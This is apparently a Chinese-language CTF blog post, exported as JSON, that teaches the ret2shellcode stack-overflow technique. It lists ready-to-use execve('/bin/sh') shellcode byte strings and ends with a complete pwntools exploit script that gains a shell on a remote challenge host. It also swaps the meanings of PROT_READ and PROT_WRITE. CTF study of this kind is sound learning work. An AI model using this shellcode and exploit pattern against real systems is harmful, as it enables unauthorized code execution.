[{"id":"f810949b38b4506e3b08df56cbb68d1d","title":"ret2shellcode","content":"ret2Shellcode​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t——by DuskyJuniXor\n\n原理\n在栈溢出的攻击技术中通常是要控制函数的返回地址到自己想要的地方执行自己想要执行的代码。ret2shellcode 代表返回到 shellcode 中即控制函数的返回地址到预先设定好的 shellcode 区域中去执行 shellcode 代码，这是非常危险的。\n\n什么是 shellcode？shellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16 进制的机器码，因为经常让攻击者获得 shell 而得名。shellcode 常常使用机器语言编写。 可在暂存器 eip 溢出后，塞入一段可让 CPU 执行的 shellcode 机器码，让电脑可以执行攻击者的任意指令。\n利用思路\nret2shellcode 的关键在于我们找到一个可读可写可执行的缓冲区，接下来把我们的 shellcode 放到这个缓冲区，然后跳转到我们的 shellcode 处执行。\n\n\n利用条件\n文件未开启 NX 保护或者有 mprotect() 函数存在修改权限\n\n常用shellcodeshellcode &#x3D;\n&quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;\n\nshellcode &#x3D; &quot;\\x31\\xc0\\x31\\xdb\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\x51\\x52\\x55\\x89\\xe5\\x0f\\x34\\x31\\xc0\\x31\\xdb\\xfe\\xc0\\x51\\x52\\x55\\x89\\xe5\\x0f\\x34&quot;\n\nshellcode &#x3D; &quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&quot;\n\n使用 Pwntools 生成 shellcode用pwntool中的shellcraft.sh(),再转汇编字节码asm()\nasm(shellcraft.sh())\n\n例题pwn2_2\n\nchecksec 检查保护，CANARY、PIE、RWX 都没有开，开启了 NX 保护\n\n\n文件拖入 ida pro 分析\n\n\n\n首先发现 mprotect() 函数，修改了 phone_number 地址权限为7（相当于 rwx）\n\n注：mprotect() 函数原型：\n#include &lt;sys&#x2F;mman.h&gt;\nint mprotect(void *addr, size_t len, int prot);\n\nprot 的取值如下，可以将几个属性结合使用（值相加）：\n\nPROT_READ：可写，值为 1\nPROT_WRITE：可读， 值为 2\nPROT_EXEC：可执行，值为 4\nPROT_NONE：不允许访问，值为 0\n\n\n\n\n没有发现可利用的 backdoor，但发现 main() 中调用了 read() 函数将 STDIN 区的缓存读入 phone_number，再查看 phone_number 的地址在 .bss 段，由上步可知phone_number具有 RWX 权限，同时有容易溢出的栈 buf\n\n\n于是思路明确，只要第一次向 phone_number 中写入 shellcode，再溢出 buf 使 rip 指向 phone_number 的地址\n\n编写 exp.py\nfrom pwn import *\ncontext(os &#x3D; &#39;linux&#39;, arch &#x3D; &#39;amd64&#39;, log_level &#x3D; &#39;debug&#39;)\n\nio &#x3D; remote(&quot;gxh191.top&quot;, 25532)\n\nphone_number &#x3D; 0x4040A0\n\npayload1 &#x3D; asm(shellcraft.sh())\nio.sendafter(b&#39;number: &#39;, payload1)\n\npayload2 &#x3D; b&#39;a&#39;*24 + p64(phone_number)\nio.sendafter(b&#39;buf: &#39;, payload2)\n\nio.interactive()\n\n成功 getshell！\n\n\n\n\n","slug":"ret2shellcode","date":"2022-11-03T04:58:03.000Z","categories_index":"","tags_index":"pwn","author_index":"DuskyJuniXor"}]